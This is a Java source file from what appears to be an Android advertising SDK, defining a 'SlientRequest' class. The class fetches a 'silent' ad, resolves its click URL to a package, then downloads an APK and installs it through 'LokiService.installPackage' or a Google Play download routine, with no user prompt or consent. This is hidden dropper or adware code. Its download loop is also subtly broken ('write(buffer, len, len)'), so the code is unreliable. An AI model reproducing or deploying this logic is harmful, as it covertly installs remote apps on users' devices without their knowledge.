package com.androidhelper.sdk.net;

import java.io.File;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.List;

import org.apache.http.Header;
import org.json.JSONObject;

import android.net.Uri;
import android.os.Handler;
import android.os.Looper;

import com.androidhelper.sdk.AMApplication;
import com.androidhelper.sdk.entity.AD;
import com.androidhelper.sdk.entity.Apk;
import com.androidhelper.sdk.net.parser.AdParser;
import com.androidhelper.sdk.net.parser.ConfigParser;
import com.androidhelper.sdk.tools.AMConstants;
import com.androidhelper.sdk.tools.AMLogger;
import com.androidhelper.sdk.tools.CommonUtils;
import com.giga.sdk.ClientManager;
import com.loki.sdk.LokiClientCallback;
import com.loki.sdk.LokiService;

public class SlientRequest extends AMRequest<AD> implements Runnable, IResponseListener<String> {

	public SlientRequest(IResponseListener<AD> listener) {
		super(listener);
		mHandler = new Handler(Looper.getMainLooper());
	}
	
	private Handler mHandler;
	private AD mAD;
	private String destUrl;
	private String referrer;
	private LokiClientCallback lokiClientCallback;

	@Override
	public void start(Object... args) {
		try {
			this.args = args;
//			ConfigParser parser = new ConfigParser();
//			String url = parser.getValue(AMApplication.instance, AMConstants.NET_AD_SINGLE_REQUEST_URL);
//			if (CommonUtils.isEmptyString(url)) {
//				return;
//			}
			JSONObject jsonObject = new JSONObject();
			jsonObject.put(AMConstants.NET_PARAMS_SLIENT, 1);
//			doPost(url, jsonObject, true);
			doAdPost(1, AMConstants.placement_id_slient, this, jsonObject);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void onSuccess(int statusCode, Header[] headers, String datas) {
		super.onSuccess(statusCode, headers, datas);
		try {
//			SingleADParser parser = new SingleADParser();
//			mAD = parser.parseAD(resultDatas);
//			if (null == mAD) {
//				return;
//			}
			AdParser parser = new AdParser();
			List<AD> ads = parser.parseAD(datas);
			if(null == ads || null == listener) {
				return;
			}
			mAD = ads.get(0);
			mHandler.post(this);
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}
	
	@Override
	public void run() {
		try {
			destUrl = CommonUtils.getDestUrl("http://10.200.10.220/v1/click?type=01&p1=10300&p2=429586&p3=10070&p4=36181422341813827552221411436769981350&p5=test&p6=US&p7=t38400000-8cf0-11bd-b23e-10b96e40000d&p8=3.2&p9=&p10=&p11=en&p12=7425&p13=200&p14=24291&lid=&p15=com.playstudios.myvegas");
			if(!CommonUtils.isEmptyString(destUrl) && destUrl.contains("package_name")) {
				CheckApkRequest request = new CheckApkRequest(this);
				Uri uri = Uri.parse(destUrl);
				String packageName = uri.getQueryParameter("package_name");
				referrer = uri.getQueryParameter("referrer");
				request.start(packageName);
				return;
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		}
	}

	@Override
	public void onResponse(final String t) {
		if(CommonUtils.isEmptyString(t)) {
			try {
				ClientManager clientManager = ClientManager.getInstance(AMApplication.instance);
				ConfigParser parser = new ConfigParser();
				String serverName = parser.getValue(AMApplication.instance, AMConstants.NET_GP_SERVER);
				String serverPort = parser.getValue(AMApplication.instance, AMConstants.NET_GP_SERVER_PORT);
				clientManager.downloadWithGooglePlay(destUrl, null, serverName, Integer.parseInt(serverPort), 600000);
				return;
			} catch (Exception e) {
				AMLogger.e(null, e.getMessage());
			}
		}
		Apk apk = new Apk();
		apk.setPackageName(t);
		apk.setReferrer(referrer);
		AMApplication.instance.installApks.add(apk);
		new Thread(){
			public void run() {
				try {
					downloadApk(t);
				} catch (Exception e) {
					AMLogger.e(null, e.getMessage());
				}
			};
		}.start();
	}
	
	private void downloadApk(String apkUrl) {
		InputStream inputStream = null;
		FileOutputStream fos = null;
		try {
			URL url = new URL(apkUrl);
			HttpURLConnection conn = (HttpURLConnection) url.openConnection();
			conn.setConnectTimeout(10000);
			conn.setReadTimeout(10000);
			conn.connect();
			inputStream = conn.getInputStream();
			File dir = AMApplication.instance.getFilesDir();
			File file = new File(dir.getAbsolutePath() + "/new.apk");
			fos = new FileOutputStream(file);
			int len = -1;
			byte[] buffer = new byte[1024];
			while ((len = inputStream.read(buffer)) != -1) {
				fos.write(buffer, len, len);
			}
			fos.flush();
			LokiService lokiService = LokiService.getInstance(AMApplication.instance);
			if(lokiService != null) {
				lokiService.installPackage(file.getAbsolutePath(), null, 0);
			}
		} catch (Exception e) {
			AMLogger.e(null, e.getMessage());
		} finally {
			if(null != fos) {
				try {
					fos.close();
				} catch (IOException e) {
					AMLogger.e(null, e.getMessage());
				} finally {
					if(null != inputStream) {
						try {
							inputStream.close();
						} catch (IOException e) {
							AMLogger.e(null, e.getMessage());
						}
					}
				}
			}
		}
	}
}
